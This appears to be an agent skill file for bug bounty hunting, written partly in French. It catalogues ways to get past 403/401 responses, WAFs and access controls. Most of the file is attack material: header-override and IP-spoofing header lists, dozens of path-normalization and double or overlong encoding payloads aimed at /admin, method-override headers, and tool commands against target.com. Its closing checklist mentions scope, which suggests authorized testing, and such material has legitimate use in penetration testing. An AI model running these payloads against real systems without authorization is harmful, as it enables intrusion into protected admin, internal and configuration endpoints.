---
name: hunt-403-bypass
description: Hunt and bypass 403 Forbidden, 401 Unauthorized, WAF blocks, and path/ACL restrictions. Use when receiving 403/401, Access Denied, WAF challenge, restricted path, or blocked admin/internal endpoints. Covers path normalization, header overrides (X-Original-URL, X-Rewrite-URL, IP trust headers), HTTP method tampering, double encoding, unicode/overlong, case switching, and tools (nomore403, byp4xx, forbidden). Trigger on 403, 401, forbidden, access denied, WAF, restricted path, ACL bypass, X-Original-URL, X-Rewrite-URL.
sources: hackerone_public, community, nomore403, byp4xx, hacktricks, public_research
report_count: 15+
---

# HUNT-403-BYPASS — 403 / 401 / WAF / ACL Bypass

## When to use
- 403 / 401 / Access Denied
- Chemins bloqués intéressants (/admin, /api/internal, /debug, /.env, /actuator, /nginx_status...)
- WAF qui bloque
- Différence possible entre edge/proxy et backend

---

## Techniques prioritaires

### 1. Header-based Path Overrides

```http
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Override-URL: /admin
X-Forwarded-Path: /admin
X-Proxy-URL: /admin
```

### 2. IP Trust / Internal Spoofing Headers

```http
X-Forwarded-For: 127.0.0.1
X-Forwarded-For: 127.0.0.1:80
X-Real-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
True-Client-IP: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
X-Originating-IP: 127.0.0.1
Client-IP: 127.0.0.1
Cluster-Client-IP: 127.0.0.1
Forwarded: for=127.0.0.1
X-Forwarded-Host: localhost
X-Host: localhost
Host: localhost
```

### 3. Path Normalization Techniques

```
/admin
/admin/
//admin
///admin
/./admin
/admin/.
/admin/./
/admin?
/admin??
/admin/?
/admin#
/admin%20
/admin%09
/admin%00
/admin%0a
/admin%0d
/%2e/admin
/admin%2f
/admin;/
/admin..;/
/..;/admin
/.;/admin
/;/admin
//;//admin
/%2e%2e/admin
/admin.json
/admin.css
/admin.html
/admin~
/admin/°/
/ADMIN
/Admin
/aDmIn
```

**Double / Triple Encoding :**

```
/%252e/admin
/%252fadmin
/admin%252f
/%c0%afadmin
/%c0%ae%c0%ae/admin
/%ef%bc%8fadmin
```

### 4. HTTP Method Tampering

```http
X-HTTP-Method-Override: GET
X-HTTP-Method: GET
X-Method-Override: GET
```

---

## Outils recommandés

| Outil         | Intérêt                        | Commande exemple |
|---------------|--------------------------------|------------------|
| **nomore403** | Le meilleur actuellement       | `nomore403 -u https://target.com/admin -x http://127.0.0.1:8080 -v` |
| **byp4xx**    | Classique et efficace          | `byp4xx https://target.com/admin` |
| **forbidden** | Très complet (Python)          | `forbidden -u https://target.com/admin -t all` |
| Burp / Caido  | Contrôle précis + comparaison  | Repeater / Intruder |

---

## Validation
- Différence réelle avec le baseline (status + length + body)
- Accès réel à du contenu protégé
- Impact clair
- Reproductible
- In-scope
